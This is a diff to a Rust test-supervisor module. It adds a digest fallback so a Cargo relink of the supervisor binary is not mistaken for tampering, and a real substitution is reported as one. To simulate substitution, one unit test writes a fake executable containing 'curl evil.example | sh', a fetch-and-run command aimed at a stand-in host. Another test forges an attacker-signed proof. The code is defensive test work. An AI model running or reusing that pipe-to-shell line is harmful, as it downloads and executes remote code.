@@ -571,6 +571,58 @@ fn duplicate_validated_proof(fd: std::os::fd::RawFd) -> anyhow::Result<std::fs::
     Ok(proof)
 }
 
+/// Confirm the supervisor executable is still the program that minted the proof.
+///
+/// The inode pair is the fast path and the strong one: same device, same inode,
+/// same file. But it cannot stand alone, because a legitimate rebuild allocates
+/// a new inode — Cargo replaces a binary by writing a new file and renaming it
+/// into place, and `finch-test-supervisor` is a workspace target that the
+/// supervised `cargo test` can relink underneath the running supervisor. That
+/// produced `supervisor executable identity changed` on untouched `main`,
+/// indistinguishable from a genuine substitution, which is exactly what made a
+/// real breach dismissible as a known nuisance (#259).
+///
+/// So a mismatched inode falls back to what the image *contains*. Same bytes is
+/// the same program however it got there; different bytes is a substitution and
+/// is named as one.
+#[cfg(unix)]
+fn verify_supervisor_image(
+    recorded_identity: &str,
+    recorded_digest: &str,
+    executable: &std::path::Path,
+) -> anyhow::Result<()> {
+    use anyhow::Context as _;
+    use sha2::{Digest as _, Sha256};
+    use std::os::unix::fs::MetadataExt as _;
+
+    let metadata = std::fs::metadata(executable)?;
+    if recorded_identity == format!("{}:{}", metadata.dev(), metadata.ino()) {
+        return Ok(());
+    }
+
+    let digest = hex::encode(Sha256::digest(std::fs::read(executable).with_context(
+        || {
+            format!(
+                "supervisor executable {} could not be read to check for substitution",
+                executable.display()
+            )
+        },
+    )?));
+    anyhow::ensure!(
+        digest == recorded_digest,
+        "supervisor executable was replaced with a different program at {}; \
+         this is a substitution, not a rebuild — the recorded image digest does \
+         not match the file now at that path",
+        executable.display()
+    );
+    tracing::warn!(
+        executable = %executable.display(),
+        "supervisor executable was relinked between proof mint and verification; \
+         the image is byte-identical, so the proof still holds"
+    );
+    Ok(())
+}
+
 fn expected_supervisor_executable() -> anyhow::Result<std::path::PathBuf> {
     let test_executable = std::env::current_exe()?.canonicalize()?;
     let mut directory = test_executable
@@ -755,6 +807,9 @@ fn isolated_test_proof_with_encoded() -> anyhow::Result<(IsolatedTestProof, Vec<
     let supervisor_identity = lines
         .next()
         .context("wrapper proof is missing its supervisor executable identity")?;
+    let supervisor_digest = lines
+        .next()
+        .context("wrapper proof is missing its supervisor executable digest")?;
     anyhow::ensure!(lines.next().is_none(), "wrapper proof has trailing fields");
     anyhow::ensure!(
         std::env::var("FINCH_BRAIN_TEST_TOKEN").as_deref() == Ok(token),
@@ -772,14 +827,11 @@ fn isolated_test_proof_with_encoded() -> anyhow::Result<(IsolatedTestProof, Vec<
         "proof issuer is not an ancestor test supervisor"
     );
     #[cfg(unix)]
-    {
-        use std::os::unix::fs::MetadataExt as _;
-        let metadata = std::fs::metadata(&supervisor_executable)?;
-        anyhow::ensure!(
-            supervisor_identity == format!("{}:{}", metadata.dev(), metadata.ino()),
-            "supervisor executable identity changed"
-        );
-    }
+    verify_supervisor_image(
+        supervisor_identity,
+        supervisor_digest,
+        &supervisor_executable,
+    )?;
     #[cfg(unix)]
     {
         use std::os::fd::AsRawFd as _;
@@ -1087,6 +1139,61 @@ fn isolated_test_peer_process_is_owned(peer_pid: nix::libc::pid_t) -> bool {
 #[cfg(all(test, unix))]
 mod isolation_tests {
     use super::*;
+
+    /// #259. The supervisor's own rebuild must not read as an attack, and an
+    /// attack must not read as a rebuild.
+    ///
+    /// `finch-test-supervisor` is a workspace binary target, so the supervised
+    /// `cargo test` can relink it. Cargo replaces a binary by writing a new file
+    /// and renaming it into place, which allocates a new inode — so the recorded
+    /// `(dev, ino)` stopped matching and the check fired against the
+    /// supervisor's own rebuild with `supervisor executable identity changed`.
+    /// That is exactly what a genuine substitution looks like, which made a real
+    /// breach dismissible as the known nuisance.
+    #[cfg(unix)]
+    #[test]
+    fn supervisor_image_check_separates_a_rebuild_from_a_substitution() {
+        use sha2::{Digest as _, Sha256};
+        use std::os::unix::fs::MetadataExt as _;
+
+        let temp = tempfile::tempdir().unwrap();
+        let executable = temp.path().join("finch-test-supervisor");
+        let image = b"#!/bin/sh\nexit 0\n";
+        std::fs::write(&executable, image).unwrap();
+
+        let metadata = std::fs::metadata(&executable).unwrap();
+        let identity = format!("{}:{}", metadata.dev(), metadata.ino());
+        let digest = hex::encode(Sha256::digest(image));
+
+        // Unchanged: the fast path.
+        verify_supervisor_image(&identity, &digest, &executable)
+            .expect("an untouched supervisor must verify");
+
+        // A rebuild: same program, new inode, exactly how Cargo replaces a
+        // binary. Write beside it and rename, so the inode really does change.
+        let relinked = temp.path().join("finch-test-supervisor.new");
+        std::fs::write(&relinked, image).unwrap();
+        std::fs::rename(&relinked, &executable).unwrap();
+        let rebuilt = std::fs::metadata(&executable).unwrap();
+        assert_ne!(
+            format!("{}:{}", rebuilt.dev(), rebuilt.ino()),
+            identity,
+            "the rename must allocate a new inode, or this test proves nothing"
+        );
+        verify_supervisor_image(&identity, &digest, &executable)
+            .expect("a relink of the same program must be accepted, not read as an attack");
+
+        // A substitution: a different program at the same path.
+        std::fs::write(&executable, b"#!/bin/sh\ncurl evil.example | sh\n").unwrap();
+        let error = verify_supervisor_image(&identity, &digest, &executable)
+            .expect_err("a different program at that path must be refused");
+        let message = error.to_string();
+        assert!(
+            message.contains("substitution") && message.contains("not a rebuild"),
+            "the diagnostic must name substitution, so a real breach is not \
+             dismissed as the rebuild nuisance; got {message:?}"
+        );
+    }
 
     const HOSTILE_MODE_DEADLINE: std::time::Duration = std::time::Duration::from_secs(10);
     const HOSTILE_MODE_OUTPUT_LIMIT: usize = 64 * 1024;
@@ -1682,6 +1789,11 @@ mod isolation_tests {
                     executable_metadata.dev(),
                     executable_metadata.ino()
                 )
+                .unwrap();
+                writeln!(forged, "{}", {
+                    use sha2::Digest as _;
+                    hex::encode(sha2::Sha256::digest(std::fs::read(&executable).unwrap()))
+                })
                 .unwrap();
                 let signature = attacker_key.sign(&forged);
                 writeln!(forged, "{}", hex::encode(signature.to_bytes())).unwrap();
